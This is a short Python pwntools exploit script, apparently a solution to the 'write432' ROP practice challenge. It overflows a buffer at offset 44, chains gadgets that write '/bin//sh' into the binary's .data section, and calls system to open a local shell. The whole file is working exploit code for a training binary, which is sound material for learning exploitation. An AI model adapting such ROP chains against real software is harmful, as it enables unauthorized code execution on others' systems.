#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 44			# EIP Offset at 44
    data_addr = 0x0804a028		# readelf -x .data write432
    pop_edi_ebp = p32(0x080486da)	# pop edi ; pop ebp ; ret
    mov_edi_ebp = p32(0x08048670)	# mov dword ptr [edi], ebp ; ret
    system_plt =p32(0x8048430)		# objdump -d write432 | grep system@plt

    # Write "/bin" string into .data section
    rop = pop_edi_ebp
    rop += p32(data_addr)
    rop += "/bin"
    rop += mov_edi_ebp

    # Write "//sh" string into .data section after "/bin"
    rop += pop_edi_ebp
    rop += p32(data_addr+4)
    rop += "//sh"
    rop += mov_edi_ebp

    # System call to execute "/bin/sh"
    payload = junk + rop + system_plt + "junk" + p32(data_addr)
    p = process("./write432")

    p.sendlineafter("> ",payload)
    p.interactive()

if __name__ == "__main__":
    main()
